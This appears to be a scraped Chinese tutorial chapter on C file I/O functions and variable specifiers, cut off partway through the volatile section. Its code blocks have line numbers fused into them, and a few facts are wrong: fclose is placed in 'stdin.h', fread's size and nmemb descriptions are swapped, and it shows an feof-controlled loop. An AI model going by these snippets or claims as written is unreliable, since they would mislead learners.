&lt;stdio.h&gt;int main(void) { FILE* fp; char c; fp = fopen(&quot;hello.txt&quot;, &quot;r&quot;); if (fp == NULL) { return -1; } c = fgetc(fp); printf(&quot;%c\\n&quot;, c); fclose(fp); return 0;} 上面示例中，新建文件指针fp以后，依次使用了下面三个文件操作函数，分成三个步骤。其他的文件操作，大致上也是这样的步骤。 第一步，使用fopen()打开指定文件，返回一个 File 指针。如果出错，返回 NULL。 它相当于将指定文件的信息与新建的文件指针fp相关联，在 FILE 结构内部记录了这样一些信息：文件内部的当前读写位置、读写报错的记录、文件结尾指示器、缓冲区开始位置的指针、文件标识符、一个计数器（统计拷贝进缓冲区的字节数）等等。后继的操作就可以使用这个指针（而不是文件名）来处理指定文件。 同时，它还为文件建立一个缓存区。由于存在缓存区，也可以说fopen()函数“打开一个了流”，后继的读写文件都是流模式。 第二步，使用读写函数，从文件读取数据，或者向文件写入数据。上例使用了fgetc()函数，从已经打开的文件里面，读取一个字符。 fgetc()一调用，文件的数据块先拷贝到缓冲区。不同的计算机有不同的缓冲区大小，一般是512字节或是它的倍数，如4096或16384。随着计算机硬盘容量越来越大，缓冲区也越来越大。 fgetc()从缓冲区读取数据，同时将文件指针内部的读写位置指示器，指向所读取字符的下一个字符。所有的文件读取函数都使用相同的缓冲区，后面再调用任何一个读取函数，都将从指示器指向的位置，即上一次读取函数停止的位置开始读取。 当读取函数发现已读完缓冲区里面的所有字符时，会请求把下一个缓冲区大小的数据块，从文件拷贝到缓冲区中。读取函数就以这种方式，读完文件的所有内容，直到文件结尾。不过，上例是只从缓存区读取一个字符。当函数在缓冲区里面，读完文件的最后一个字符时，就把 FILE 结构里面的文件结尾指示器设置为真。于是，下一次再调用读取函数时，会返回常量 EOF。EOF 是一个整数值，代表文件结尾，一般是-1。 第三步，fclose()关闭文件，同时清空缓存区。 上面是文件读取的过程，文件写入也是类似的方式，先把数据写入缓冲区，当缓冲区填满后，缓存区的数据将被转移到文件中。 fopen()fopen()函数用来打开文件。所有文件操作的第一步，都是使用fopen()打开指定文件。这个函数的原型定义在头文件stdio.h。 1FILE* fopen(char* filename, char* mode); 它接受两个参数。第一个参数是文件名(可以包含路径)，第二个参数是模式字符串，指定对文件执行的操作，比如下面的例子中，r表示以读取模式打开文件。 1fp = fopen(&quot;in.dat&quot;, &quot;r&quot;); 成功打开文件以后，fopen()返回一个 FILE 指针，其他函数可以用这个指针操作文件。如果无法打开文件（比如文件不存在或没有权限），会返回空指针 NULL。所以，执行fopen()以后，最好判断一下，有没有打开成功。 123456fp = fopen(&quot;hello.txt&quot;, &quot;r&quot;);if (fp == NULL) { printf(&quot;Can't open file!\\n&quot;); exit(EXIT_FAILURE);} 上面示例中，如果fopen()返回一个空指针，程序就会报错。 fopen()的模式字符串有以下几种。 r：读模式，只用来读取数据。如果文件不存在，返回 NULL 指针。 w：写模式，只用来写入数据。如果文件存在，文件长度会被截为0，然后再写入；如果文件不存在，则创建该文件。 a：写模式，只用来在文件尾部追加数据。如果文件不存在，则创建该文件。 r+：读写模式。如果文件存在，指针指向文件开始处，可以在文件头部添加数据。如果文件不存在，返回 NULL 指针。 w+：读写模式。如果文件存在，文件长度会被截为0，然后再写入数据。这种模式实际上读不到数据，反而会擦掉数据。如果文件不存在，则创建该文件。 a+：读写模式。如果文件存在，指针指向文件结尾，可以在现有文件末尾添加内容。如果文件不存在，则创建该文件。 上一小节说过，fopen()函数会为打开的文件创建一个缓冲区。读模式下，创建的是读缓存区；写模式下，创建的是写缓存区；读写模式下，会同时创建两个缓冲区。C 语言通过缓存区，以流的形式，向文件读写数据。 数据在文件里面，都是以二进制形式存储。但是，读取的时候，有不同的解读方法：以原本的二进制形式解读，叫做“二进制流”；将二进制数据转成文本，以文本形式解读，叫做“文本流”。写入操作也是如此，分成以二进制写入和以文本写入，后者会多一个文本转二进制的步骤。 fopen()的模式字符串，默认是以文本流读写。如果添加b后缀（表示 binary），就会以“二进制流”进行读写。比如，rb是读取二进制数据模式，wb是写入二进制数据模式。 模式字符串还有一个x后缀，表示独占模式（exclusive）。如果文件已经存在，则打开文件失败；如果文件不存在，则新建文件，打开后不再允许其他程序或线程访问当前文件。比如，wx表示以独占模式写入文件，如果文件已经存在，就会打开失败。 标准流Linux 系统默认提供三个已经打开的文件，它们的文件指针如下。 stdin（标准输入）：默认来源为键盘，文件指针编号为0。 stdout（标准输出）：默认目的地为显示器，文件指针编号为1。 stderr（标准错误）：默认目的地为显示器，文件指针编号为2。 Linux 系统的文件，不一定是数据文件，也可以是设备文件，即文件代表一个可以读或写的设备。文件指针stdin默认是把键盘看作一个文件，读取这个文件，就能获取用户的键盘输入。同理，stdout和stderr默认是把显示器看作一个文件，将程序的运行结果写入这个文件，用户就能看到运行结果了。它们的区别是，stdout写入的是程序的正常运行结果，stderr写入的是程序的报错信息。 这三个输入和输出渠道，是 Linux 默认提供的，所以分别称为标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。因为它们的实现是一样的，都是文件流，所以合称为“标准流”。 Linux 允许改变这三个文件指针（文件流）指向的文件，这称为重定向（redirection）。 如果标准输入不绑定键盘，而是绑定其他文件，可以在文件名前面加上小于号&lt;，跟在程序名后面。这叫做“输入重定向”（input redirection）。 1demo &lt; in.dat 上面示例中，demo程序代码里面的stdin，将指向文件in.dat，即从in.dat获取数据。 如果标准输出绑定其他文件，而不是显示器，可以在文件名前加上大于号&gt;，跟在程序名后面。这叫做“输出重定向”（output redirection）。 1demo &gt; out.dat 上面示例中，demo程序代码里面的stdout，将指向文件out.dat，即向out.dat写入数据。 输出重定向&gt;会先擦去out.dat的所有原有的内容，然后再写入。如果希望写入的信息追加在out.dat的结尾，可以使用&gt;&gt;符号。 1demo &gt;&gt; out.dat 上面示例中，demo程序代码里面的stdout，将向文件out.dat写入数据。与&gt;不同的是，写入的开始位置是out.dat的文件结尾。 标准错误的重定向符号是2&gt;。其中的2代表文件指针的编号，即2&gt;表示将2号文件指针的写入，重定向到err.txt。2号文件指针就是标准错误stderr。 1demo &gt; out.dat 2&gt; err.txt 上面示例中，demo程序代码里面的stderr，会向文件err.txt写入报错信息。而stdout向文件out.dat写入。 输入重定向和输出重定向，也可以结合在一条命令里面。 1234$ demo &lt; in.dat &gt; out.dat// or$ demo &gt; out.dat &lt; in.dat 重定向还有另一种情况，就是将一个程序的标准输出stdout，指向另一个程序的标准输入stdin，这时要使用|符号。 1random | sum 上面示例中，random程序代码里面的stdout的写入，会从sum程序代码里面的stdin被读取。 fclose()fclose()用来关闭已经使用fopen()打开的文件。它的原型定义在stdin.h。 1int fclose(FILE* stream); 它接受一个文件指针fp作为参数。如果成功关闭文件，fclose()函数返回整数0；如果操作失败（比如磁盘已满，或者出现 I/O 错误），则返回一个特殊值 EOF（详见下一小节）。 12if (fclose(fp) != 0) printf(&quot;Something wrong.&quot;); 不再使用的文件，都应该使用fclose()关闭，否则无法释放资源。一般来说，系统对同时打开的文件数量有限制，及时关闭文件可以避免超过这个限制。 EOFC 语言的文件操作函数的设计是，如果遇到文件结尾，就返回一个特殊值。程序接收到这个特殊值，就知道已经到达文件结尾了。 头文件stdio.h为这个特殊值定义了一个宏EOF（end of file 的缩写），它的值一般是-1。这是因为从文件读取的二进制值，不管作为无符号数字解释，还是作为 ASCII 码解释，都不可能是负值，所以可以很安全地返回-1，不会跟文件本身的数据相冲突。 需要注意的是，不像字符串结尾真的存储了\\0这个值，EOF并不存储在文件结尾，文件中并不存在这个值，完全是文件操作函数发现到达了文件结尾，而返回这个值。 freopen()freopen()用于新打开一个文件，直接关联到某个已经打开的文件指针。这样可以复用文件指针。它的原型定义在头文件stdio.h。 1FILE* freopen(char* filename, char* mode, FILE stream); 它跟fopen()相比，就是多出了第三个参数，表示要复用的文件指针。其他两个参数都一样，分别是文件名和打开模式。 12freopen(&quot;output.txt&quot;, &quot;w&quot;, stdout);printf(&quot;hello&quot;); 上面示例将文件output.txt关联到stdout，此后向stdout写入的内容，都会写入output.txt。由于printf()默认就是输出到stdout，所以运行上面的代码以后，文件output.txt会被写入hello。 freopen()的返回值是它的第三个参数（文件指针）。如果打开失败（比如文件不存在），会返回空指针 NULL。 freopen()会自动关闭原先已经打开的文件，如果文件指针并没有指向已经打开的文件，则freopen()等同于fopen()。 下面是freopen()关联scanf()的例子。 123456int i, i2;scanf(&quot;%d&quot;, &amp;i); freopen(&quot;someints.txt&quot;, &quot;r&quot;, stdin);scanf(&quot;%d&quot;, &amp;i2); 上面例子中，一共调用了两次scanf()，第一次调用是从键盘读取，然后使用freopen()将stdin指针关联到某个文件，第二次调用就会从该文件读取。 某些系统允许使用freopen()，改变文件的打开模式。这时，freopen()的第一个参数应该是 NULL。 1freopen(NULL, &quot;wb&quot;, stdout); 上面示例将stdout的打开模式从w改成了wb。 fgetc()，getc()fgetc()和getc()用于从文件读取一个字符。它们的用法跟getchar()类似，区别是getchar()只用来从stdin读取，而这两个函数是从任意指定的文件读取。它们的原型定义在头文件stdio.h。 12int fgetc(FILE *stream)int getc(FILE *stream); fgetc()与getc()的用法是一样的，都只有文件指针一个参数。两者的区别是，getc()一般用宏来实现，而fgetc()是函数实现，所以前者的性能可能更好一些。注意，虽然这两个函数返回的是一个字符，但是它们的返回值类型却不是char，而是int，这是因为读取失败的情况下，它们会返回 EOF，这个值一般是-1。 123456789101112#include &lt;stdio.h&gt;int main(void) { FILE *fp; fp = fopen(&quot;hello.txt&quot;, &quot;r&quot;); int c; while ((c = getc(fp)) != EOF) printf(&quot;%c&quot;, c); fclose(fp);} 上面示例中，getc()依次读取文件的每个字符，将其放入变量c，直到读到文件结尾，返回 EOF，循环终止。变量c的类型是int，而不是char，因为有可能等于负值，所以设为int更好一些。 fputc()，putc()fputc()和putc()用于向文件写入一个字符。它们的用法跟putchar()类似，区别是putchar()是向stdout写入，而这两个函数是向文件写入。它们的原型定义在头文件stdio.h。 12int fputc(int char, FILE *stream);int putc(int char, FILE *stream); fputc()与putc()的用法是一样，都接受两个参数，第一个参数是待写入的字符，第二个参数是文件指针。它们的区别是，putc()通常是使用宏来实现，而fputc()只作为函数来实现，所以理论上，putc()的性能会好一点。 写入成功时，它们返回写入的字符；写入失败时，返回 EOF。 fprintf()fprintf()用于向文件写入格式化字符串，用法与printf()类似。区别是printf()总是写入stdout，而fprintf()则是写入指定的文件，它的第一个参数必须是一个文件指针。它的原型定义在头文件stdio.h。 1int fprintf(FILE* stream, const char* format, ...) fprintf()可以替代printf()。 12printf(&quot;Hello, world!\\n&quot;);fprintf(stdout, &quot;Hello, world!\\n&quot;); 上面例子中，指定fprintf()写入stdout，结果就等同于调用printf()。 1fprintf(fp, &quot;Sum: %d\\n&quot;, sum); 上面示例是向文件指针fp写入指定格式的字符串。 下面是向stderr输出错误信息的例子。 1fprintf(stderr, &quot;Something number.\\n&quot;); fscanf()fscanf()用于按照给定的模式，从文件中读取内容，用法跟scanf()类似。区别是scanf()总是从stdin读取数据，而fscanf()是从文件读入数据，它的原型定义在头文件stdio.h，第一个参数必须是文件指针。 1int fscanf(FILE* stream, const char* format, ...); 下面是一个例子。 1fscanf(fp, &quot;%d%d&quot;, &amp;i, &amp;j); 上面示例中，fscanf()从文件fp里面，读取两个整数，放入变量i和j。 使用fscanf()的前提是知道文件的结构，它的占位符解析规则与scanf()完全一致。由于fscanf()可以连续读取，直到读到文件尾，或者发生错误（读取失败、匹配失败），才会停止读取，所以fscanf()通常放在循环里面。 12while(fscanf(fp, &quot;%s&quot;, words) == 1) puts(words); 上面示例中，fscanf()依次读取文件的每个词，将它们一行打印一个，直到文件结束。 fscanf()的返回值是赋值成功的变量数量，如果赋值失败会返回 EOF。 fgets()fgets()用于从文件读取指定长度的字符串，它名字的第一个字符是f，就代表file。它的原型定义在头文件stdio.h。 1char* fgets(char* str, int STRLEN, File* fp); 它的第一个参数str是一个字符串指针，用于存放读取的内容。第二个参数STRLEN指定读取的长度，第三个参数是一个 FILE 指针，指向要读取的文件。 fgets()读取 STRLEN - 1 个字符之后，或者遇到换行符与文件结尾，就会停止读取，然后在已经读取的内容末尾添加一个空字符\\0，使之成为一个字符串。注意，fgets()会将换行符（\\n）存储进字符串。 如果fgets的第三个参数是stdin，就可以读取标准输入，等同于scanf()。 1fgets(str, sizeof(str), stdin); 读取成功时，fgets()的返回值是它的第一个参数，即指向字符串的指针，否则返回空指针 NULL。 fgets()可以用来读取文件的每一行，下面是读取文件所有行的例子。 1234567891011121314#include &lt;stdio.h&gt;int main(void) { FILE* fp; char s[1024]; // 数组必须足够大，足以放下一行 int linecount = 0; fp = fopen(&quot;hello.txt&quot;, &quot;r&quot;); while (fgets(s, sizeof s, fp) != NULL) printf(&quot;%d: %s&quot;, ++linecount, s); fclose(fp);} 上面示例中，每读取一行，都会输出行号和该行的内容。 下面的例子是循环读取用户的输入。 123456789101112char words[10];puts(&quot;Enter strings (q to quit):&quot;);while (fgets(words, 10, stdin) != NULL) { if (words[0] == 'q' &amp;&amp; words[1] == '\\n') break; puts(words);}puts(&quot;Done.&quot;); 上面的示例中，如果用户输入的字符串大于9个字符，fgets()会多次读取。直到遇到q + 回车键，才会退出循环。 fputs()fputs()函数用于向文件写入字符串，和puts()函数只有一点不同，那就是它不会在字符串末尾添加换行符。这是因为fgets()保留了换行符，所以fputs()就不添加了。fputs()函数通常与fgets()配对使用。 它的原型定义在stdio.h。 1int fputs(const char* str, FILE* stream); 它接受两个参数，第一个参数是字符串指针，第二个参数是要写入的文件指针。如果第二个参数为stdout（标准输出），就是将内容输出到计算机屏幕，等同于printf()。 1234567char words[14];puts(&quot;Enter a string, please.&quot;);fgets(words, 14, stdin);puts(&quot;This is your string:&quot;);fputs(words, stdout); 上面示例中，先用fgets()从stdin读取用户输入，然后用fputs()输出到stdout。 写入成功时，fputs()返回一个非负整数，否则返回 EOF。 fwrite()fwrite()用来一次性写入较大的数据块，主要用途是将数组数据一次性写入文件，适合写入二进制数据。它的原型定义在stdio.h。 123456size_t fwrite( const void* ptr, size_t size, size_t nmemb, FILE* fp); 它接受四个参数。 ptr：数组指针。 size：每个数组成员的大小，单位字节。 nmemb：数组成员的数量。 fp：要写入的文件指针。 注意，fwrite()原型的第一个参数类型是void*，这是一个无类型指针，编译器会自动将参数指针转成void*类型。正是由于fwrite()不知道数组成员的类型，所以才需要知道每个成员的大小（第二个参数）和成员数量（第三个参数）。 fwrite()函数的返回值是成功写入的数组成员的数量（注意不是字节数）。正常情况下，该返回值就是第三个参数nmemb，但如果出现写入错误，只写入了一部分成员，返回值会比nmemb小。 要将整个数组arr写入文件，可以采用下面的写法。 123456fwrite( arr, sizeof(arr[0]), sizeof(arr) / sizeof(arr[0]), fp); 上面示例中，sizeof(a[0])是每个数组成员占用的字节，sizeof(a) / sizeof(a[0])是整个数组的成员数量。 下面的例子是将一个大小为256字节的字符串写入文件。 123char buffer[256];fwrite(buffer, 1, 256, fp); 上面示例中，数组buffer每个成员是1个字节，一共有256个成员。由于fwrite()是连续内存复制，所以写成fwrite(buffer, 256, 1, fp)也能达到目的。 fwrite()没有规定一定要写入整个数组，只写入数组的一部分也是可以的。 任何类型的数据都可以看成是1字节数据组成的数组，或者是一个成员的数组，所以fwrite()实际上可以写入任何类型的数据，而不仅仅是数组。比如，fwrite()可以将一个 Struct 结构写入文件保存。 1fwrite(&amp;s, sizeof(s), 1, fp); 上面示例中，s是一个 Struct 结构指针，可以看成是一个成员的数组。注意，如果s的属性包含指针，存储时需要小心，因为保存指针可能没意义，还原出来的时候，并不能保证指针指向的数据还存在。 fwrite()以及后面要介绍的fread()，比较适合读写二进制数据，因为它们不会对写入的数据进行解读。二进制数据可能包含空字符\\0，这是 C 语言的字符串结尾标记，所以读写二进制文件，不适合使用文本读写函数（比如fprintf()等）。 下面是一个写入二进制文件的例子。 1234567891011#include &lt;stdio.h&gt;int main(void) { FILE* fp; unsigned char bytes[] = {5, 37, 0, 88, 255, 12}; fp = fopen(&quot;output.bin&quot;, &quot;wb&quot;); fwrite(bytes, sizeof(char), sizeof(bytes), fp); fclose(fp); return 0;} 上面示例中，写入二进制文件时，fopen()要使用wb模式打开，表示二进制写入。fwrite()可以把数据解释成单字节数组，因此它的第二个参数是sizeof(char)，第三个参数是数组的总字节数sizeof(bytes)。 上面例子写入的文件output.bin，使用十六进制编辑器打开，会是下面的内容。 105 25 00 58 ff 0c fwrite()还可以连续向一个文件写入数据。 12345struct clientData myClient = {1, 'foo bar'};for (int i = 1; i &lt;= 100; i++) { fwrite(&amp;myClient, sizeof(struct clientData), 1, cfPtr);} 上面示例中，fwrite()连续将100条数据写入文件。 fread()fread()函数用于一次性从文件读取较大的数据块，主要用途是将文件内容读入一个数组，适合读取二进制数据。它的原型定义在头文件stdio.h。 123456size_t fread( void* ptr, size_t size, size_t nmemb, FILE* fp); 它接受四个参数，与fwrite()完全相同。 ptr：数组地址。 size：数组的成员数量。 nmemb：每个数组成员的大小。 fp：文件指针。 要将文件内容读入数组arr，可以采用下面的写法。 123456fread( arr, sizeof(arr[0]), sizeof(arr) / sizeof(arr[0]), fp); 上面示例中，数组长度（第二个参数）和每个成员的大小（第三个参数）的乘积，就是数组占用的内存空间的大小。fread()会从文件（第四个参数）里面读取相同大小的内容，然后将ptr（第一个参数）指向这些内容的内存地址。 下面的例子是将文件内容读入一个10个成员的双精度浮点数数组。 12double earnings[10];fread(earnings, sizeof(double), 10, fp); 上面示例中，每个数组成员的大小是sizeof(double)，一个有10个成员，就会从文件fp读取sizeof(double) * 10大小的内容。 fread()函数的返回值是成功读取的数组成员的数量。正常情况下，该返回值就是第三个参数nmemb，但如果出现读取错误或读到文件结尾，该返回值就会比nmemb小。所以，检查fread()的返回值是非常重要的。 fread()和fwrite()可以配合使用。在程序终止之前，使用fwrite()将数据保存进文件，下次运行时再用fread()将数据还原进入内存。 下面是读取上一节生成的二进制文件output.bin的例子。 1234567891011#include &lt;stdio.h&gt;int main(void) { FILE* fp; unsigned char c; fp = fopen(&quot;output.bin&quot;, &quot;rb&quot;); while (fread(&amp;c, sizeof(char), 1, fp) &gt; 0) printf(&quot;%d\\n&quot;, c); return 0;} 运行后，得到如下结果。 12345653708825512 feof()feof()函数判断文件的内部指针是否指向文件结尾。它的原型定义在头文件stdio.h。 1int feof(FILE *fp); feof()接受一个文件指针作为参数。如果已经到达文件结尾，会返回一个非零值（表示 true），否则返回0（表示 false）。 诸如fgetc()这样的文件读取函数，如果返回 EOF，有两种可能，一种可能是已读取到文件结尾，另一种可能是出现读取错误。feof()可以用来判断到底是那一种情况。 下面是通过feof()判断是否到达文件结尾，从而循环读取整个文件的例子。 1234567891011int num;char name[50];FILE* cfPtr = fopen(&quot;clients.txt&quot;, &quot;r&quot;);while (!feof(cfPtr)) { fscanf(cfPtr, &quot;%d%s\\n&quot;, &amp;num, name); printf(&quot;%d %s\\n&quot;, num, name);}fclose(cfPtr); 上面示例通过循环判断feof()是否读到文件结尾，从而实现读出整个文件内容。 feof()为真时，可以通过fseek()、rewind()、fsetpos()函数改变文件内部读写位置的指示器，从而清除这个函数的状态。 fseek()每个文件指针都有一个内部指示器（内部指针），记录当前打开的文件的读写位置（file position），即下一次读写从哪里开始。文件操作函数（比如getc()、fgets()、fscanf()和fread()等）都从这个指示器指定的位置开始按顺序读写文件。 如果希望改变这个指示器，将它移到文件的指定位置，可以使用fseek()函数。它的原型定义在头文件stdio.h。 1int fseek(FILE* stream, long int offset, int whence); fseek()接受3个参数。 stream：文件指针。 offset：距离基准（第三个参数）的字节数。类型为 long int，可以为正值（向文件末尾移动）、负值（向文件开始处移动）或 0（保持不动）。 whence：位置基准，用来确定计算起点。它的值是以下三个宏（定义在stdio.h）：SEEK_SET（文件开始处）、SEEK_CUR（内部指针的当前位置）、SEEK_END（文件末尾） 请看下面的例子。 1234567891011121314// 定位到文件开始处fseek(fp, 0L, SEEK_SET);// 定位到文件末尾fseek(fp, 0L, SEEK_END);// 从当前位置前移2个字节fseek(fp, 2L, SEEK_CUR);// 定位到文件第10个字节fseek(fp, 10L, SEEK_SET);// 定位到文件倒数第10个字节fseek(fp, -10L, SEEK_END); 上面示例中，fseek()的第二个参数为 long 类型，所以移动距离必须加上后缀L，将其转为 long 类型。 下面的示例逆向输出文件的所有字节。 1234for (count = 1L; count &lt;= size; count++) { fseek(fp, -count, SEEK_END); ch = getc(fp);} 注意，fseek()最好只用来操作二进制文件，不要用来读取文本文件。因为文本文件的字符有不同的编码，某个位置的准确字节位置不容易确定。 正常情况下，fseek()的返回值为0。如果发生错误（如移动的距离超出文件的范围），返回值为非零值（比如-1)。 ftell()ftell()函数返回文件内部指示器的当前位置。它的原型定义在头文件stdio.h。 1long int ftell(FILE* stream); 它接受一个文件指针作为参数。返回值是一个 long 类型的整数，表示内部指示器的当前位置，即文件开始处到当前位置的字节数，0表示文件开始处。如果发生错误，ftell()返回-1L。 ftell()可以跟fseek()配合使用，先记录内部指针的位置，一系列操作过后，再用fseek()返回原来的位置。 1234long file_pos = ftell(fp);// 一系列文件操作之后fseek(fp, file_pos, SEEK_SET); 下面的例子先将指示器定位到文件结尾，然后得到文件开始处到结尾的字节数。 12fseek(fp, 0L, SEEK_END);size = ftell(fp); rewind()rewind()函数可以让文件的内部指示器回到文件开始处。它的原型定义在stdio.h。 1void rewind(file* stream); 它接受一个文件指针作为参数。 rewind(fp)基本等价于fseek(fp, 0l, seek_set)，唯一的区别是rewind()没有返回值，而且会清除当前文件的错误指示器。 fgetpos()，fsetpos()fseek()和ftell()有一个潜在的问题，那就是它们都把文件大小限制在 long int 类型能表示的范围内。这看起来相当大，但是在32位计算机上，long int 的长度为4个字节，能够表示的范围最大为 4GB。随着存储设备的容量迅猛增长，文件也越来越大，往往会超出这个范围。鉴于此，C 语言新增了两个处理大文件的新定位函数：fgetpos()和fsetpos()。 它们的原型都定义在头文件stdio.h。 12int fgetpos(FILE* stream, fpos_t* pos);int fsetpos(FILE* stream, const fpos_t* pos); fgetpos()函数会将文件内部指示器的当前位置，存储在指针变量pos。该函数接受两个参数，第一个是文件指针，第二个存储指示器位置的变量。 fsetpos()函数会将文件内部指示器的位置，移动到指针变量pos指定的地址。注意，变量pos必须是通过调用fgetpos()方法获得的。fsetpos()的两个参数与fgetpos()必须是一样的。 记录文件内部指示器位置的指针变量pos，类型为fpos_t*（file position type 的缩写，意为文件定位类型）。它不一定是整数，也可能是一个 Struct 结构。 下面是用法示例。 12345fpos_t file_pos;fgetpos(fp, &amp;file_pos);// 一系列文件操作之后fsetpos(fp, &amp;file_pos); 上面示例中，先用fgetpos()获取内部指针的位置，后面再用fsetpos()恢复指针的位置。 执行成功时，fgetpos()和fsetpos()都会返回0，否则返回非零值。 ferror()，clearerr()所有的文件操作函数如果执行失败，都会在文件指针里面记录错误状态。后面的操作只要读取错误指示器，就知道前面的操作出错了。 ferror()函数用来返回错误指示器的状态。可以通过这个函数，判断前面的文件操作是否成功。它的原型定义在头文件stdio.h。 1int ferror(FILE *stream); 它接受一个文件指针作为参数。如果前面的操作出现错误，ferror()就会返回一个非零整数（表示 true），否则返回0。 clearerr()函数用来重置出错指示器。它的原型定义在头文件stdio.h。 1void clearerr(FILE* fp); 它接受一个文件指针作为参数，没有返回值。 下面是一个例子。 12345678FILE* fp = fopen(&quot;file.txt&quot;, &quot;w&quot;);char c = fgetc(fp);if (ferror(fp)) { printf(&quot;读取文件：file.txt 时发生错误\\n&quot;);}clearerr(fp); 上面示例中，fgetc()尝试读取一个以”写模式“打开的文件，读取失败就会返回 EOF。这时调用ferror()就可以知道上一步操作出错了。处理完以后，再用clearerr()清除出错状态。 文件操作函数如果正常执行，ferror()和feof()都会返回零。如果执行不正常，就要判断到底是哪里出了问题。 123456789101112if (fscanf(fp, &quot;%d&quot;, &amp;n) != 1) { if (ferror(fp)) { printf(&quot;io error\\n&quot;); } if (feof(fp)) { printf(&quot;end of file\\n&quot;); } clearerr(fp); fclose(fp);} 上面示例中，当fscanf()函数报错时，通过检查ferror()和feof()，确定到底发生什么问题。这两个指示器改变状态后，会保持不变，所以要用clearerr()清除它们，clearerr()可以同时清除两个指示器。 remove()remove()函数用于删除指定文件。它的原型定义在头文件stdio.h。 1int remove(const char* filename); 它接受文件名作为参数。如果删除成功，remove()返回0，否则返回非零值。 1remove(&quot;foo.txt&quot;); 上面示例删除了foo.txt文件。 注意，删除文件必须是在文件关闭的状态下。如果是用fopen()打开的文件，必须先用fclose()关闭后再删除。 rename()rename()函数用于文件改名，也用于移动文件。它的原型定义在头文件stdio.h。 1int rename(const char* old_filename, const char* new_filename); 它接受两个参数，第一个参数是现在的文件名，第二个参数是新的文件名。如果改名成功，rename()返回0，否则返回非零值。 1rename(&quot;foo.txt&quot;, &quot;bar.txt&quot;); 上面示例将foo.txt改名为bar.txt。 注意，改名后的文件不能与现有文件同名。另外，如果要改名的文件已经打开了，必须先关闭，然后再改名，对打开的文件进行改名会失败。 下面是移动文件的例子。 1rename(&quot;/tmp/evidence.txt&quot;, &quot;/home/beej/nothing.txt&quot;); 变量说明符C 语言允许声明变量的时候，加上一些特定的说明符（specifier），为编译器提供变量行为的额外信息。它的主要作用是帮助编译器优化代码，有时会对程序行为产生影响。 constconst说明符表示变量是只读的，不得被修改。 12const double PI = 3.14159;PI = 3; // 报错 上面示例里面的const，表示变量PI的值不应改变。如果改变的话，编译器会报错。 对于数组，const表示数组成员不能修改。 12const int arr[] = {1, 2, 3, 4};arr[0] = 5; // 报错 上面示例中，const使得数组arr的成员无法修改。 对于指针变量，const有两种写法，含义是不一样的。如果const在*前面，表示指针指向的值不可修改。 1234// const 表示指向的值 *x 不能修改int const * x// 或者const int * x 下面示例中，对x指向的值进行修改导致报错。 1234int p = 1const int* x = &amp;p;(*x)++; // 报错 如果const在*后面，表示指针包含的地址不可修改。 12// const 表示地址 x 不能修改int* const x 下面示例中，对x进行修改导致报错。 1234int p = 1int* const x = &amp;p;x++; // 报错 这两者可以结合起来。 1const char* const x; 上面示例中，指针变量x指向一个字符串。两个const意味着，x包含的内存地址以及x指向的字符串，都不能修改。 const的一个用途，就是防止函数体内修改函数参数。如果某个参数在函数体内不会被修改，可以在函数声明时，对该参数添加const说明符。这样的话，使用这个函数的人看到原型里面的const，就知道调用函数前后，参数数组保持不变。 1void find(const int* arr, int n); 上面示例中，函数find的参数数组arr有const说明符，就说明该数组在函数内部将保持不变。 有一种情况需要注意，如果一个指针变量指向const变量，那么该指针变量也不应该被修改。 123const int i = 1;int* j = &amp;i;*j = 2; // 报错 上面示例中，j是一个指针变量，指向变量i，即j和i指向同一个地址。j本身没有const说明符，但是i有。这种情况下，j指向的值也不能被修改。 staticstatic说明符对于全局变量和局部变量有不同的含义。 （1）用于局部变量（位于块作用域内部）。 static用于函数内部声明的局部变量时，表示该变量的值会在函数每次执行后得到保留，下次执行时不会进行初始化，就类似于一个只用于函数内部的全局变量。由于不必每次执行函数时，都对该变量进行初始化，这样可以提高函数的执行速度，详见《函数》一章。 （2）用于全局变量（位于块作用域外部）。 static用于函数外部声明的全局变量时，表示该变量只用于当前文件，其他源码文件不可以引用该变量，即该变量不会被链接（link）。 static修饰的变量，初始化时，值不能等于变量，必须是常量。 12int n = 10;static m = n; // 报错 上面示例中，变量m有static修饰，它的值如果等于变量n，就会报错，必须等于常量。 只在当前文件里面使用的函数，也可以声明为static，表明该函数只在当前文件使用，其他文件可以定义同名函数。 1static int g(int i); autoauto说明符表示该变量的存储，由编译器自主分配内存空间，且只存在于定义时所在的作用域，退出作用域时会自动释放。 由于只要不是extern的变量（外部变量），都是由编译器自主分配内存空间的，这属于默认行为，所以该说明符没有实际作用，一般都省略不写。 123auto int a;// 等同于int a; externextern说明符表示，该变量在其他文件里面声明，没有必要在当前文件里面为它分配空间。通常用来表示，该变量是多个文件共享的。 1extern int a; 上面代码中，a是extern变量，表示该变量在其他文件里面定义和初始化，当前文件不必为它分配存储空间。 但是，变量声明时，同时进行初始化，extern就会无效。 12345// extern 无效extern int i = 0;// 等同于int i = 0; 上面代码中，extern对变量初始化的声明是无效的。这是为了防止多个extern对同一个变量进行多次初始化。 函数内部使用extern声明变量，就相当于该变量是静态存储，每次执行时都要从外部获取它的值。 函数本身默认是extern，即该函数可以被外部文件共享，通常省略extern不写。如果只希望函数在当前文件可用，那就需要在函数前面加上static。 123extern int f(int i);// 等同于int f(int i); registerregister说明符向编译器表示，该变量是经常使用的，应该提供最快的读取速度，所以应该放进寄存器。但是，编译器可以忽略这个说明符，不一定按照这个指示行事。 1register int a; 上面示例中，register提示编译器，变量a会经常用到，要为它提供最快的读取速度。 register只对声明在代码块内部的变量有效。 设为register的变量，不能获取它的地址。 12register int a;int *p = &amp;a; // 编译器报错 上面示例中，&amp;a会报错，因为变量a可能放在寄存器里面，无法获取内存地址。 如果数组设为register，也不能获取整个数组或任一个数组成员的地址。 1234register int a[] = {11, 22, 33, 44, 55};int p = a; // 报错int a = *(a + 2); // 报错 历史上，CPU 内部的缓存，称为寄存器（register）。与内存相比，寄存器的访问速度快得多，所以使用它们可以提高速度。但是它们不在内存之中，所以没有内存地址，这就是为什么不能获取指向它们的指针地址。现代编译器已经有巨大的进步，不管是否使用register关键字，都会尽可能使用寄存器，所以不保证一定会把这些变量放到寄存器。 volatilevolatile说明符表示所声明的变量，可能会预想不到地发生变化（即其他程序可能会更改它的值），不受当前程序控制，因此编译器不要对这类变量进行优化，每次使用时都应该查询一下它的值。硬件设备的编程中，这个说明符很常用。 12volatile int foo;volatile int* bar; volatile的目的是阻止编译器对变量行为进行优化，请看下面的例子。 123int foo = x;// 其他语句，假设没有改变 x 的值int bar = x; 上面代码中，由于变量foo和bar都等于x，而且x的值也没有发生变化，所以编译器可能会把x放入缓存，直接从缓存读取值（而不是从 x 